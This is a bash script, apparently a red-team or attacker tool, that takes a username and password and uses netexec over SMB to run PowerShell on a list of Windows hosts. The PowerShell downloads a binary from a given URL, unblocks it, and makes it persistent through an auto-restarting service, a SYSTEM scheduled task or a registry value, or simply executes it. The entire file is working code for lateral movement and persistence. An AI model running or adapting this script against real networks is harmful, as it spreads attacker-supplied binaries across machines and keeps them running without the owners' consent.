#!/bin/bash

deploy() {
    read -p "Where is the binary stored: " binary
    echo "Is the folder where you want to store the binary already on the filesystem"
    echo "1. Yes"
    echo "2. No"
    read -p "Yes or No: " create
    case $create in 
        1)
            execute "false" "$binary"
            ;;
        2)
            execute "true" "$binary"
            ;;
        *)
            echo "Invalid option"
            return 1
            ;;
    esac
}

execute() {
    local createFolder=$1
    local binary=$2
    read -rp "What user are you signing in as: " userName
    read -rp "User password: " userPass
    read -rp "Where do you want to drop the binary: " binPath
    read -rp "What do you want to name the binary: " binName

    fullPath="$binPath\\$binName"
            
    echo "Options: " 
    echo "1. Service"
    echo "2. Scheduled Task"
    echo "3. Registry Key"
    echo "4. Just Drop and Execute (No Persistence)"
    read -rp "Which option do you want to use: " persistMethod
    
    case $persistMethod in 
        1)
            read -rp "What do you want to name the service: " serviceName
            read -rp "What description do you want to use for the service: " serviceDescription
            # Modified service creation to handle non-service binaries
            persist="sc.exe create '$serviceName' binPath= '$fullPath' type= own start= auto displayname= '$serviceName'; sc.exe description '$serviceName' '$serviceDescription'; sc.exe failure '$serviceName' reset= 0 actions= restart/0/restart/0/restart/0; Start-Sleep -Seconds 2; sc.exe start '$serviceName'; if(\$?) { Write-Host 'Service started' } else { Write-Host 'Start attempted' }"
            ;;
        2)
            read -rp "What do you want to name the scheduled task: " taskName
            read -rp "How often should the task run (in minutes): " taskFrequency
            persist="schtasks /create /sc minute /mo $taskFrequency /tn \"$taskName\" /tr \"$fullPath\" /ru \"SYSTEM\" /f; schtasks /run /tn \"$taskName\""
            ;;
        3) 
            read -rp "Registry Path?: " regPath
            read -rp "Registry Key?: " regKey
            echo "Do you want to preserve any key values that may exist within the path?: "
            echo "1. Yes"
            echo "2. No"
            read -rp "Yes or No: " preserveKeys
            case $preserveKeys in 
                1)
                    read -rp "Please enter the pre-existing key values: " existingValue
                    persist="reg add '$regPath' /v '$regKey' /d '$existingValue,$fullPath' /t reg_sz /f;" 
                    ;;
                2)
                    persist="reg add '$regPath' /v '$regKey' /d '$fullPath' /t reg_sz /f;"
                    ;;
            esac
            ;;
        4)
            # Just drop and execute without persistence
            persist="Start-Process -FilePath '$fullPath'; Write-Host 'Binary executed without persistence'"
            ;;
        *)
            echo "Invalid option"
            return 1
            ;;
    esac

    echo "Generated Command: $persist"

    
    local command="Invoke-WebRequest -Uri '$binary' -OutFile '$fullPath'; Unblock-File -Path '$fullPath'; $persist"
    if [[ $createFolder == "true" ]]; then
        command="mkdir '$binPath'; $command"
    fi
    netexec smb windowsHosts.txt -u "$userName" -p "$userPass" -X "$command"
}

main() {
    deploy
}

main
